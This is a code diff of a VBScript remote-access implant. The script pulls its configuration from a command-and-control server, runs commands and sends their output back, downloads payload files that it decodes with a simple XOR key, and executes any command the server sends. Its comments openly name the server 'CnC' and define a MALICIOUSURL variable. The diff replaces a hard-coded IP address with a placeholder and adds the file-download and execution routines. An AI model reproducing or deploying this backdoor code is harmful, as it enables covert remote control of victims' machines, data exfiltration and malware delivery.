@@ -1,14 +1,16 @@
 Public SERVERADDRESS
-SERVERADDRESS = "http://104.237.4.83"
+SERVERADDRESS = "http://ServerIPorNDS"
 Public CONFIGURATIONPATH
 CONFIGURATIONPATH = "/Configuration"
 Public HEADERS
-HEADERS = "5a968c26-b565-4b65-8445-9e87780cb8f9-01"
+HEADERS = "UUID-01"
+EnKey = ""
 Public COMMANDSTOEXE
+Public FILES
+Public DEFAULTCOMMANDSTOEXE
 Public MALICIOUSURL
 MALICIOUSURL = None
 
-MsgBox "Hello World!", 65, "MsgBox Example"
 Dim TheJSONStringEncoder: Set TheJSONStringEncoder = New JSONStringEncoder
 
 Function HttpGetRequest(path)
@@ -44,10 +46,53 @@ Function conf()
 	set outputObj = json.Decode(HttpGetRequest(CONFIGURATIONPATH))
 	SERVERADDRESS = "http://"+outputObj("Server")
 	COMMANDSTOEXE = outputObj("Commands")
+	DEFAULTCOMMANDSTOEXE = outputObj("DefaultCommands")
+	FILES = outputObj("Files")
 	MALICIOUSURL = SERVERADDRESS+outputObj("MaliciousPath")
 End Function
 
-Function RunCommand(command)
+Function DownloadFile(fileDown, encr)
+	Dim http
+	Set http = CreateObject("Msxml2.ServerXMLHTTP")
+	http.Open "POST", SERVERADDRESS+"/GetAFile" , False
+	http.setRequestHeader "UUID",HEADERS
+	'http.setProxy 2, "127.0.0.1:8080", ""
+	http.send fileDown
+	Dim response(2)
+	If http.Status = 200 Then
+		response(0) = http.getResponseHeader("Filename")
+		response(1) = http.responseBody
+	End If
+	HttpGetRequestVar = response
+
+	Dim FileName,BinaryCodeToExe
+	FileName = HttpGetRequestVar(0)
+	If encr = 1 Then
+		FileName = Filename & ".enc"
+	End If
+
+	BinaryCodeToExe = HttpGetRequestVar(1)
+	'MsgBox(BinaryCodeToExe)
+	Const adTypeBinary = 1
+	Const adSaveCreateOverWrite = 2
+
+	'Create Stream object
+	Dim BinaryStream
+	Set BinaryStream = CreateObject("ADODB.Stream")
+
+	'Specify stream type - we want To save binary data.
+	BinaryStream.Type = adTypeBinary
+
+	'Open the stream And write binary data To the object
+	BinaryStream.Open
+	BinaryStream.Write BinaryCodeToExe
+
+	'Save binary data To disk
+	BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
+	DownloadFile = FileName
+End Function
+
+Function RunDefaultCommand(command)
 	Dim ObjExec
 	Dim strFromProc
 	Dim result
@@ -57,7 +102,15 @@ Function RunCommand(command)
 		strFromProc = ObjExec.StdOut.ReadAll()
 		result = strFromProc
 	Loop While Not ObjExec.Stdout.atEndOfStream
-	RunCommand = result
+	RunDefaultCommand= result
+End Function
+
+Function RunCommand(command)
+	Dim ObjExec
+	Dim strFromProc
+	Dim result
+	Set objShell = WScript.CreateObject("WScript.Shell")
+	Set ObjExec = objShell.Exec(command )
 End Function
 
 Function JsonEncodeQuotes(input)
@@ -80,10 +133,21 @@ End Function
 
 Function Activate()
 	dim res
-	res = HttpPostRequest("/Commands",PreperToSend("Activated",FormatDateTime(Now)+"\r\n"))
-	For Each command In COMMANDSTOEXE
-		MsgBox command
-		Call HttpPostRequest("/Commands",PreperToSend(command,RunCommand(command)))
+	res = HttpPostRequest("/Commands",PreperToSend("Activated",FormatDateTime(Now))) 'Client activate the code (flag)
+	For Each command In DEFAULTCOMMANDSTOEXE 'Run the default commands and send the output to the server
+		Call HttpPostRequest("/Commands",PreperToSend(command,RunDefaultCommand(command)))
+	Next
+	For Each file In FILES 'Download each required file from the Server (CnC) and store it
+		Call DownloadFile(file,1)
+		Dim arrKey, errResult
+		arrKey = GetKey(HEADERS)
+		errResult = Encode( CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)&"\"&file&".enc", CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)&"\"&file, arrKey )
+		If errResult <> 0 Then
+		ShowError errResult
+End If
+	Next
+	For Each command In COMMANDSTOEXE 'Client execute each command
+		Call RunCommand(command)
 	Next
 	Activate = res
 End Function
@@ -93,6 +157,7 @@ Call conf()
 Call Activate()
 
 
+'========= JSON Parser for VBScript ===========
 'http://demon.tw/my-work/vbs-json.html
 
 Class VbsJson
@@ -532,4 +597,143 @@ Public Function JSONStringify(Thing)
             End If
     End Select
 
+End Function
+
+'=========================== Encryption =============================
+'
+
+
+Sub ShowError( myError )
+    On Error Resume Next
+    Err.Raise myError
+    WScript.Echo "ERROR " & Err.Number & ": " & Err.Description
+    Err.Clear
+    On Error Goto 0
+    WScript.Quit
+End Sub
+
+
+Function Encode( myFileIn, myFileOut, arrCode )
+' This function provides a simple (ASCII) text encoder/decoder using XOR.
+' Because it uses XOR, both encoding and decoding can be performed by the
+' same function, with the same key.
+'
+' Arguments:
+' myFileIn   [string]        input text file (file to be encoded)
+' myFileOut  [string]        output file (encoded text)
+' arrCode    [array of int]  "key", consisting of any number of integers
+'                            from 1 to 255; avoid 0, though it can be used,
+'                            it doesn't encode anything.
+'                            Use any number of elements in the "key" array,
+'                            each element multiplies the number of possible
+'                            keys by 255 (not 256 since 0 is avoided).
+'                            If only a single element is used, it may be
+'                            passed either as an array or as a single integer.
+'
+' Return code:
+' 0 if all went well, otherwise the appropriate error number.
+'
+' Written by Rob van der Woude
+' http://www.robvanderwoude.com
+
+    ' Standard housekeeping
+    Dim i, objFSO, objFileIn, objFileOut, objStreamIn
+
+    Const ForAppending       =  8
+    Const ForReading         =  1
+    Const ForWriting         =  2
+    Const TristateFalse      =  0
+    Const TristateMixed      = -2
+    Const TristateTrue       = -1
+    Const TristateUseDefault = -2
+
+    ' Use custom error handling
+    On Error Resume Next
+
+    ' If the "key" is a single digit, convert it to an array
+    If Not IsArray( arrCode ) Then
+        arrCode = Array( arrCode )
+    End If
+
+    ' Check if a valid "key" array is used
+    For i = 0 To UBound( arrCode )
+        If Not IsNumeric( arrCode(i) ) Then
+            ' 1032    Invalid character
+            Encode = 1032
+            Exit Function
+        End If
+        If arrCode(i) < 0 Or arrCode(i) > 255 Then
+            ' 1031    Invalid number
+            Encode = 1031
+            Exit Function
+        End If
+    Next
+
+    ' Open a file system object
+    Set objFSO = CreateObject( "Scripting.FileSystemObject" )
+
+    ' Open the input file if it exists
+    If objFSO.FileExists( myFileIn ) Then
+        Set objFileIn   = objFSO.GetFile( myFileIn )
+        Set objStreamIn = objFileIn.OpenAsTextStream( ForReading, TriStateFalse )
+    Else
+        ' Error 53: File not found
+        Encode = 53
+        ' Close input file and release objects
+        objStreamIn.Close
+        Set objStreamIn = Nothing
+        Set objFileIn   = Nothing
+        Set objFSO      = Nothing
+        ' Abort
+        Exit Function
+    End If
+
+    ' Create the output file, unless it already exists
+    If objFSO.FileExists( myFileOut ) Then
+        ' Error 58: File already exists
+        Encode = 58
+        ' Close input file and release objects
+        objStreamIn.Close
+        Set objStreamIn = Nothing
+        Set objFileIn   = Nothing
+        Set objFSO      = Nothing
+        ' Abort
+        Exit Function
+    Else
+        Set objFileOut = objFSO.CreateTextFile( myFileOut, True, False )
+    End If
+
+    ' Encode the text from the input file and write it to the output file
+    i = 0
+    Do Until objStreamIn.AtEndOfStream
+        i = ( i + 1 ) \ ( UBound( arrCode ) + 1 )
+        objFileOut.Write Chr( Asc( objStreamIn.Read( 1 ) ) Xor arrCode(i) )
+    Loop
+
+    ' Close files and release objects
+    objFileOut.Close
+    objStreamIn.Close
+    Set objStreamIn = Nothing
+    Set objFileIn   = Nothing
+    Set objFileOut  = Nothing
+    Set objFSO      = Nothing
+
+    ' Return the error number as status information
+    Encode = Err.Number
+
+    ' Done
+    Err.Clear
+    On Error Goto 0
+End Function
+
+
+Function GetKey( myPassPhrase )
+' This function converts a password or passphrase
+' into a "key" array for the Encode function.
+    Dim i, arrCode( )
+    ReDim arrCode( Len( myPassPhrase ) - 1 )
+    For i = 0 To UBound( arrCode )
+        arrCode(i) = Asc( Mid( myPassPhrase, i + 1, 1 ) )
+    Next
+    GetKey = arrCode
 End Function
